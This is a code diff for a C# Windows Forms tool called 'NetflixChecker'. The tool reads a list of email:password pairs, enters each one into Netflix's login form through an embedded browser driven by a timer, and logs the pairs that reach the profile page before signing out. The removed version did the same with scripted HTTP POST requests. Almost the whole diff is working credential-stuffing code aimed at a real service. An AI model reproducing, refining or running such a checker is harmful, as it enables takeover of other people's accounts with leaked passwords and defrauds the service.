@@ -5,6 +5,7 @@ using System.Data;
 using System.Drawing;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.IO;
@@ -15,6 +16,11 @@ namespace NetflixChecker
 {
     public partial class Form1 : Form
     {
+        bool keepGoing;
+        int counter = 0;
+        int location = 0;
+        string publicsave, username, password, st;
+        string[] accounts;
         public Form1()
         {
             InitializeComponent();
@@ -27,106 +33,106 @@ namespace NetflixChecker
 
         private void scanner_Click(object sender, EventArgs e)
         {
-            int accounts = textBox1.Lines.Length;
-            string url = "https://www.netflix.com/Login";
-            for (int i = 0; i != accounts; i++)
-            {
-                foreach (string st in textBox1.Lines)
-                {
-                    if (string.IsNullOrEmpty(st))
-                    {
-                        continue;
-                    }
-                    int location = st.IndexOf(':');
-                    string username = st.Substring(0,location);
-                    string password = st.Substring(location,st.Length-(location));
-                    password = password.Replace(':',' ');
-                    password.Trim();
-                    login(username,password);
-                }
-                
-            }
+            keepGoing = true;
+            scanner.Enabled = false;
+            button1.Enabled = true;
+            timerLogin.Enabled = true;
         }
-
         private void adder_Click(object sender, EventArgs e)
-        {
-            string path = string.Empty;
-            string[] accounts;
-            OpenFileDialog ofd = new OpenFileDialog();
-            ofd.ShowDialog();
-            path = ofd.FileName;
-            accounts = File.ReadAllLines(path);
-            textBox1.Text = string.Empty;
-            foreach (string account in accounts)
-            {
-                textBox1.Text += "\n" + account;
-            }
-            adder.Enabled = false;
-        }
-        private void login(string username, string password)
         {
             try
             {
-                CookieCollection cookies = new CookieCollection();
-                HttpWebRequest request =
-                    (HttpWebRequest)WebRequest.Create("https://www.netflix.com/login");
-                request.CookieContainer = new CookieContainer();
-                request.CookieContainer.Add(cookies);
-                //Get the response from the server and save the cookies from the first request..
-                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
-                cookies = response.Cookies;
 
-
-                string formparams = string.Format("email={0}&password={1}",
-                                                   username, password);
-
-                //Create a request using a URL that can recieve a post
-                HttpWebRequest webreq =
-                    (HttpWebRequest)WebRequest.Create("https://www.netflix.com/login");
-                webreq.CookieContainer = new CookieContainer();
-                webreq.CookieContainer.Add(cookies);
-                //Set a method property of the request to POST
-                webreq.Method = "POST";
-                webreq.Referer = "https://www.netflix.com/login";
-                webreq.ContentType = "application/x-www-form-urlencoded";
-                webreq.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2";
-
-
-                //Create a POST data and convert it to a byte array
-                byte[] bytes = Encoding.ASCII.GetBytes(formparams);
-
-                webreq.ContentLength = bytes.Length;
-
-                //write
-                Stream postdata = webreq.GetRequestStream(); //open connection
-                postdata.Write(bytes, 0, bytes.Length); //send the data
-                postdata.Close();
-
-
-                WebResponse resp = webreq.GetResponse();
-                Stream answer = resp.GetResponseStream();
-
-
-                StreamReader _answer = new
-                      StreamReader(webreq.GetResponse().GetResponseStream());
-
-                string reply = _answer.ReadToEnd();
-
-                textBox2.Text = reply;
-
-                if (reply.Contains("Restart Your Membership"))
+                string path = string.Empty;
+                OpenFileDialog ofd = new OpenFileDialog();
+                ofd.ShowDialog();
+                path = ofd.FileName;
+                accounts = File.ReadAllLines(path);
+                textBox1.Text = string.Empty;
+                foreach (string account in accounts)
                 {
-                    MessageBox.Show("working");
+                    textBox1.Text += "\n" + account;
                 }
-                else
-                {
-                    MessageBox.Show("not Working");
-                }
-                textBox2.Clear();
+                adder.Enabled = false;
+                button2.Enabled = true;
             }
-            catch (Exception e)
+            catch (Exception)
             {
-                MessageBox.Show(e.Message);
+
+            }
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            textBox1.Clear();
+            adder.Enabled = true;
+            button2.Enabled = false;
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            keepGoing = false;
+            scanner.Enabled = true;
+            button1.Enabled = false;
+        }
+
+        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+            string newURL = webBrowser1.Url.ToString();
+            if (newURL.Contains("ProfilesGate"))
+            {
+                webBrowser1.Navigate("https://www.netflix.com/signout");
+                textBox2.Text += Environment.NewLine + publicsave;
+            }
+        }
+        private void login(string username, string password)
+        {
+            timerLogin.Enabled = false;
+            if (webBrowser1.ReadyState == WebBrowserReadyState.Complete)
+            {
+                var emailField = webBrowser1.Document.GetElementById("email");
+                var passField = webBrowser1.Document.GetElementById("password");
+                var button = webBrowser1.Document.GetElementById("login-form-contBtn");
+                emailField.SetAttribute("value", username);
+                Thread.Sleep(10);
+                passField.SetAttribute("value", password);
+                Thread.Sleep(10);
+                button.InvokeMember("click");
+                Thread.Sleep(10);
+                Console.WriteLine("im actually running");
+                timerLogin.Enabled = true;
+            }
+            else
+            {
+                login(username,password);
+            }
+        }
+
+        private void timerLogin_Tick(object sender, EventArgs e)
+        {
+            try
+            {
+                st = accounts[counter];
+                this.Text = "Netflix Account Scanner: " + st;
+                counter++;
+                webBrowser1.Refresh(WebBrowserRefreshOption.Completely);
+                if (string.IsNullOrEmpty(st)) return;
+                else if (st.Contains('-')) return;
+                else if (!keepGoing) timerLogin.Enabled = false; ;
+                publicsave = st;
+                location = st.IndexOf(':');
+                username = st.Substring(0, location);
+                password = st.Substring(location, st.Length - (location));
+                password = password.Replace(':', ' ');
+                password = password.Trim();
+                login(username, password);
+            }
+            catch (Exception ee)
+            {
+                this.Text = "Netflix Account Scanner: " + "Finished!";
+                button1.PerformClick();
+                MessageBox.Show("it appears we've finished checking your accounts, thanks for using me!");
+                timerLogin.Enabled = false;
             }
         }
     }
